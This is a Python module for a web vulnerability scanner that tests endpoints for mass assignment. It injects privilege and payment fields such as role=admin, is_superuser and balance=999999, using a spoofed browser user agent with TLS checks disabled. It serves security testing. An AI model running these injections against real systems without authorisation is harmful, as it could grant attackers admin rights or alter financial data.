"""Mass assignment tester — privilege escalation field injection.

Tests POST/PUT/PATCH endpoints by injecting admin/role/privilege fields
that shouldn't be user-controllable. Detects mass assignment when the
server accepts and persists unauthorized fields.
"""

from __future__ import annotations

import json
import re
from typing import Any

import aiohttp
import structlog

logger = structlog.get_logger()

_TIMEOUT = aiohttp.ClientTimeout(total=15)
_HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}

# ---------------------------------------------------------------------------
# Privilege escalation fields to inject
# ---------------------------------------------------------------------------

_PRIV_FIELDS: list[dict[str, Any]] = [
    {"name": "role", "values": ["admin", "administrator", "superuser"]},
    {"name": "is_admin", "values": [True, 1, "true"]},
    {"name": "isAdmin", "values": [True, 1, "true"]},
    {"name": "admin", "values": [True, 1, "true"]},
    {"name": "is_staff", "values": [True, 1, "true"]},
    {"name": "is_superuser", "values": [True, 1, "true"]},
    {"name": "privilege", "values": ["admin", "root"]},
    {"name": "permissions", "values": ["*", "admin"]},
    {"name": "user_type", "values": ["admin", "staff"]},
    {"name": "userType", "values": ["admin", "staff"]},
    {"name": "access_level", "values": [99, "admin"]},
    {"name": "group", "values": ["admin", "administrators"]},
    {"name": "groups", "values": [["admin"], ["administrators"]]},
    {"name": "verified", "values": [True, 1]},
    {"name": "email_verified", "values": [True, 1]},
    {"name": "active", "values": [True, 1]},
    {"name": "approved", "values": [True, 1]},
    {"name": "balance", "values": [999999]},
    {"name": "credits", "values": [999999]},
    {"name": "price", "values": [0, 0.01]},
    {"name": "discount", "values": [100, 99.99]},
]

# Fields that indicate privilege in response
_PRIV_INDICATORS = re.compile(
    r'"(?:role|is_admin|isAdmin|admin|is_staff|is_superuser|privilege|'
    r'permissions|user_type|userType|access_level|group)"\s*:\s*'
    r'(?:"admin"|"administrator"|"superuser"|true|1|99|\[)',
    re.I,
)


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------


async def test_mass_assignment(
    target_url: str,
    original_params: dict[str, str] | None = None,
    method: str = "POST",
    content_type: str = "json",
    auth_token: str | None = None,
) -> dict[str, Any]:
    """Test a POST/PUT/PATCH endpoint for mass assignment vulnerabilities.

    target_url: the endpoint to test
    original_params: legitimate params for the endpoint (e.g., {"name": "test"})
    method: HTTP method (POST, PUT, PATCH)
    content_type: "json" or "form"
    auth_token: optional Bearer token for authenticated testing
    """
    if original_params is None:
        original_params = {}

    findings: list[dict[str, Any]] = []
    accepted_fields: list[str] = []

    headers = {**_HEADERS}
    if auth_token:
        headers["Authorization"] = f"Bearer {auth_token}"

    try:
        async with aiohttp.ClientSession() as session:
            # Step 1: Baseline request with legitimate params only
            baseline_status, baseline_body = await _send(
                session, target_url, original_params, method, content_type, headers,
            )

            if baseline_status == 0:
                return {
                    "vulnerable": False,
                    "endpoint": target_url,
                    "error": "Could not reach endpoint",
                }

            # Step 2: Inject each privilege field individually
            for field_def in _PRIV_FIELDS:
                field_name = field_def["name"]

                for value in field_def["values"]:
                    # Build payload: original params + injected field
                    test_data = {**original_params, field_name: value}

                    status, body = await _send(
                        session, target_url, test_data, method, content_type, headers,
                    )

                    if status == 0:
                        continue

                    # Success indicators:
                    # 1. Server accepted the field (200/201 vs 400/422)
                    # 2. Field appears in response with our value
                    # 3. Response differs from baseline (not just ignored)

                    field_accepted = False

                    # Check if our injected value appears in response
                    value_str = json.dumps(value) if not isinstance(value, str) else f'"{value}"'
                    if f'"{field_name}"' in body and (
                        str(value).lower() in body.lower()
                    ):
                        field_accepted = True

                    # Check if server returned success for a field it shouldn't accept
                    if status in (200, 201) and baseline_status in (200, 201):
                        if len(body) != len(baseline_body) and field_name not in str(original_params):
                            field_accepted = True

                    if field_accepted:
                        accepted_fields.append(field_name)
                        findings.append({
                            "field": field_name,
                            "injected_value": value,
                            "status_code": status,
                            "evidence": body[:300],
                            "severity": _severity_for_field(field_name),
                        })
                        break  # One finding per field is enough

            # Step 3: Batch injection (all priv fields at once)
            if not findings:
                batch_data = dict(original_params)
                for field_def in _PRIV_FIELDS[:5]:
                    batch_data[field_def["name"]] = field_def["values"][0]

                status, body = await _send(
                    session, target_url, batch_data, method, content_type, headers,
                )

                if status in (200, 201) and _PRIV_INDICATORS.search(body):
                    findings.append({
                        "field": "batch_injection",
                        "injected_value": {f["name"]: f["values"][0] for f in _PRIV_FIELDS[:5]},
                        "status_code": status,
                        "evidence": body[:500],
                        "severity": "high",
                    })

    except Exception as exc:
        logger.warning("mass_assignment.error", error=str(exc))

    return {
        "vulnerable": bool(findings),
        "endpoint": target_url,
        "method": method,
        "findings": findings,
        "accepted_fields": list(set(accepted_fields)),
        "fields_tested": len(_PRIV_FIELDS),
    }


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


async def _send(
    session: aiohttp.ClientSession,
    url: str,
    data: dict[str, Any],
    method: str,
    content_type: str,
    headers: dict[str, str],
) -> tuple[int, str]:
    """Send request with given method and content type. Never raises."""
    try:
        kwargs: dict[str, Any] = {
            "headers": headers,
            "ssl": False,
            "timeout": _TIMEOUT,
            "allow_redirects": True,
        }
        if content_type == "json":
            kwargs["json"] = data
        else:
            # Convert non-string values for form encoding
            kwargs["data"] = {k: str(v) for k, v in data.items()}

        async with session.request(method, url, **kwargs) as resp:
            body = await resp.text(errors="replace")
            return resp.status, body[:50_000]
    except Exception:
        return 0, ""


def _severity_for_field(field_name: str) -> str:
    """Map field name to severity level."""
    critical_fields = {
        "role", "is_admin", "isAdmin", "admin", "is_staff",
        "is_superuser", "privilege", "permissions", "access_level",
        "user_type", "userType", "group", "groups",
    }
    high_fields = {"verified", "email_verified", "active", "approved"}
    money_fields = {"balance", "credits", "price", "discount"}

    if field_name in critical_fields:
        return "critical"
    if field_name in high_fields:
        return "high"
    if field_name in money_fields:
        return "high"
    return "medium"
